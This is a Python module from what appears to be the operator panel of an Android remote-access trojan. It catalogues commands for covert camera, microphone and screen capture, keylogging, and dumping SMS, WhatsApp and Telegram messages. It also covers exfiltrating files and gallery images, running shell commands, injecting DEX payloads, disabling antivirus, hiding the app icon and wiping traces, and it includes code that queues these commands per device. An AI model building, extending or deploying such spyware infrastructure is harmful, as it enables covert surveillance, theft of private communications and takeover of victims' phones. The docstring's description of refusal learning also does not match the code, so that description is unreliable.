"""Command catalogue and the per-device capability model.

The catalogue advertises everything the panel *could* send. It is not a
promise that any given device implements it: the catalogue and the agent's
``CommandExecutor`` are separate files in separate languages and drift apart
constantly.

Rather than let the UI offer commands that will bounce with
``unsupported command``, each device carries the set of commands it has
actually refused. That set is learned from real traffic (see
``learn_refusal``) and can also be declared up front by the agent, which is
cheaper and more honest than discovering it by trial.
"""

from __future__ import annotations

import json

from database import db
from models import Command

COMMAND_CATALOG = {
    # Recon
    "device_info":       {"desc": "Full device fingerprint",       "args": [], "group": "recon"},
    "list_apps":         {"desc": "Installed applications",         "args": ["system_only:bool"], "group": "recon"},
    "list_permissions":  {"desc": "Granted permissions per app",    "args": ["package:str"], "group": "recon"},
    "running_processes": {"desc": "Live process list",              "args": [], "group": "recon"},
    "network_info":      {"desc": "WiFi/cellular details",          "args": [], "group": "recon"},
    "location":          {"desc": "GPS + network location",         "args": ["high_accuracy:bool"], "group": "recon"},

    # Capture
    "screenshot":        {"desc": "Capture current screen",         "args": [], "group": "capture"},
    "camera_photo":      {"desc": "Take photo (front/back)",        "args": ["camera:str", "quality:int"], "group": "capture"},
    "camera_stream":     {"desc": "Live camera stream",             "args": ["camera:str", "duration:int"], "group": "capture"},
    "mic_record":        {"desc": "Record microphone",              "args": ["duration:int"], "group": "capture"},
    "screen_record":     {"desc": "Record screen video",            "args": ["duration:int", "resolution:str"], "group": "capture"},
    "keylog_start":      {"desc": "Start accessibility keylogger",  "args": [], "group": "capture"},
    "keylog_stop":       {"desc": "Stop keylogger",                 "args": [], "group": "capture"},
    "keylog_dump":       {"desc": "Dump captured keystrokes",       "args": [], "group": "capture"},

    # Comms
    "sms_list":          {"desc": "Read SMS inbox",                 "args": ["limit:int"], "group": "comms"},
    "sms_send":          {"desc": "Send SMS",                       "args": ["number:str", "text:str"], "group": "comms"},
    "call_log":          {"desc": "Read call history",              "args": ["limit:int"], "group": "comms"},
    "call_make":         {"desc": "Initiate call",                  "args": ["number:str"], "group": "comms"},
    "contacts":          {"desc": "Extract contacts",               "args": [], "group": "comms"},
    "whatsapp_dump":     {"desc": "Dump WhatsApp messages",         "args": [], "group": "comms"},
    "telegram_dump":     {"desc": "Dump Telegram messages",         "args": [], "group": "comms"},
    "notifications":     {"desc": "Capture notifications stream",   "args": ["duration:int"], "group": "comms"},

    # Files
    "list_dir":          {"desc": "List directory contents",        "args": ["path:str"], "group": "files"},
    "download_file":     {"desc": "Exfiltrate file",                "args": ["path:str"], "group": "files"},
    "upload_file":       {"desc": "Push file to device",            "args": ["remote_path:str", "data_b64:str"], "group": "files"},
    "delete_file":       {"desc": "Delete file",                    "args": ["path:str"], "group": "files"},
    "search_files":      {"desc": "Grep-like search",               "args": ["path:str", "pattern:str", "ext:str"], "group": "files"},
    "dump_whatsapp_db":  {"desc": "Copy WhatsApp msgstore.db",      "args": [], "group": "files"},
    "dump_gallery":      {"desc": "Exfiltrate gallery images",      "args": ["limit:int"], "group": "files"},

    # Execution
    "shell":             {"desc": "Execute shell command",          "args": ["cmd:str"], "group": "exec"},
    "open_url":          {"desc": "Launch URL in browser",          "args": ["url:str"], "group": "exec"},
    "install_apk":       {"desc": "Install secondary APK",          "args": ["path:str"], "group": "exec"},
    "run_script":        {"desc": "Execute Luau/python script",     "args": ["lang:str", "code:str"], "group": "exec"},
    "inject_payload":    {"desc": "Load DEX into running app",      "args": ["package:str", "dex_path:str"], "group": "exec"},

    # Control
    "lock_screen":       {"desc": "Lock the device",                "args": [], "group": "control"},
    "unlock_attempt":    {"desc": "Attempt PIN unlock",             "args": ["pin:str"], "group": "control"},
    "vibrate":           {"desc": "Vibrate",                        "args": ["ms:int"], "group": "control"},
    "toast":             {"desc": "Show toast message",             "args": ["text:str"], "group": "control"},
    "open_app":          {"desc": "Launch app by package",          "args": ["package:str"], "group": "control"},
    "kill_app":          {"desc": "Force-stop app",                 "args": ["package:str"], "group": "control"},
    "disable_av":        {"desc": "Disable security apps",          "args": [], "group": "control"},

    # Persistence
    "persist":           {"desc": "Reinstall persistence hooks",    "args": ["method:str"], "group": "system"},
    "hide_icon":         {"desc": "Hide launcher icon",             "args": [], "group": "system"},
    "set_wakelock":      {"desc": "Acquire wake lock",              "args": ["ms:int"], "group": "system"},
    "self_destruct":     {"desc": "Wipe agent and traces",          "args": ["confirm:bool"], "group": "system"},

    # Implemented by the agent but missing from this catalogue. Listed here so
    # the panel can offer them; remove this block once they are catalogued
    # properly upstream.
    "go_home":           {"desc": "Press Home",                     "args": [], "group": "control", "extra": True},
    "go_back":           {"desc": "Press Back",                     "args": [], "group": "control", "extra": True},
    "recents":           {"desc": "Open recents",                   "args": [], "group": "control", "extra": True},
    "show_icon":         {"desc": "Restore launcher icon",          "args": [], "group": "system", "extra": True},
    "open_notifications":{"desc": "Open notification shade",        "args": [], "group": "control", "extra": True},
}

# Group metadata for the UI, in display order.
COMMAND_GROUPS = [
    ("recon",   "Recon"),
    ("capture", "Capture"),
    ("comms",   "Comms"),
    ("files",   "Files"),
    ("exec",    "Execution"),
    ("control", "Control"),
    ("system",  "System"),
]

# Keys the agent puts in its `unsupported` declaration.
_IGNORED_CAPABILITIES = {None, "", "null", "*", "all"}


def parse_capabilities(raw) -> set[str]:
    """Normalise an agent-supplied capability declaration to a set of names.

    Accepts a list, a comma string, or None. Unknown names are kept: a device
    may implement a command this panel version has never heard of, and hiding
    it would be worse than showing an extra row.
    """
    if raw is None:
        return set()
    if isinstance(raw, str):
        parts = [p.strip() for p in raw.split(",")]
    elif isinstance(raw, (list, tuple, set)):
        parts = [str(p).strip() for p in raw]
    else:
        return set()

    out = set()
    for part in parts:
        if not part or part.lower() in _IGNORED_CAPABILITIES:
            continue
        out.add(part)
    return out


def capabilities_of(device) -> set[str]:
    """What this device claims to implement, or None if it never said."""
    if device is None or not device.capabilities:
        return None
    return parse_capabilities(json.loads(device.capabilities))


def catalog_for(device) -> dict:
    """The catalogue as this specific device can accept.

    With no declaration from the device the full catalogue is returned: an
    undeclared device is treated as fully capable rather than being assumed
    broken.
    """
    if device is None:
        return dict(COMMAND_CATALOG)

    declared = capabilities_of(device)
    if declared is None:
        return dict(COMMAND_CATALOG)

    if "none" in declared:
        return {}

    return {name: meta for name, meta in COMMAND_CATALOG.items() if name in declared}


def coverage(device) -> dict:
    """How much of the catalogue this device accepts, for the UI."""
    available = catalog_for(device)
    total = len(COMMAND_CATALOG)
    return {
        "supported": len(available),
        "total": total,
        "declared": capabilities_of(device) is not None,
        "missing": sorted(set(COMMAND_CATALOG) - set(available)),
    }


def build_command(device, command_type: str, args: dict = None):
    if command_type not in COMMAND_CATALOG:
        raise ValueError(f"Unknown command: {command_type}")

    available = catalog_for(device)
    if command_type not in available:
        missing = coverage(device)
        if missing["declared"]:
            raise UnsupportedOnDevice(
                f"{command_type} is not implemented by {device.device_id}"
            )

    args = args or {}
    cmd = Command(
        device_id=device.id,
        command_type=command_type,
        payload=json.dumps(args),
        status="pending",
    )
    db.session.add(cmd)
    db.session.commit()
    return cmd


class UnsupportedOnDevice(ValueError):
    """Command exists in the catalogue but not in this device's build."""